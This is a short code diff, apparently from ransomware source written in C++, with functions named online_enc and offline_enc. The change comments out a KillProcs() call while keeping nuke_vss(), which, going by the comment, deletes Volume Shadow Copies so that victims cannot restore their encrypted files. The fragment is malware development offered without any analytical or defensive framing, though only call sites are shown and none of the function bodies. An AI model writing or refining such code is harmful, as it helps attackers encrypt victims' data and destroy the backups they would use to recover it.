@@ -77,8 +77,8 @@ int online_enc() {
         SaveResultsToFile(filePath, files);
     }
 
-    // kill all processes and nuke VSS
-    KillProcs();
+    // kill all processes and nuke VSS (killing processes might cause errors)
+    // KillProcs();
     nuke_vss();
 
 
@@ -211,7 +211,7 @@ int offline_enc() {
         SaveResultsToFile(filePath, files); 
     }
     
-    KillProcs();
+    // KillProcs();
     nuke_vss();
 
     std::vector<std::wstring> filesToProcess;
